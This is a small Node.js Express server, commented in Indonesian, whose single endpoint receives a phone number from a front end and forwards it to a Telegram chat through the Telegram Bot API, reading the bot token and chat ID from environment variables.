const express = require('express');
const fetch = require('node-fetch');
const app = express();
require('dotenv').config(); // Menggunakan dotenv untuk mengakses environment variables

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Token bot dari GitHub Secrets
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Chat ID dari GitHub Secrets

app.use(express.json()); // Middleware untuk parsing JSON

// Endpoint untuk menerima nomor HP dari front-end
app.post('/send-phone', async (req, res) => {
  const { phoneNumber } = req.body;

  if (!phoneNumber) {
    return res.status(400).json({ error: "Nomor HP tidak boleh kosong." });
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `Nomor HP: ${phoneNumber}`
      })
    });

    if (response.ok) {
      res.json({ message: "Nomor HP berhasil dikirim!" });
    } else {
      res.status(500).json({ error: "Gagal mengirim nomor HP ke Telegram." });
    }
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "Terjadi kesalahan, coba lagi nanti." });
  }
});

// Menentukan port untuk server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});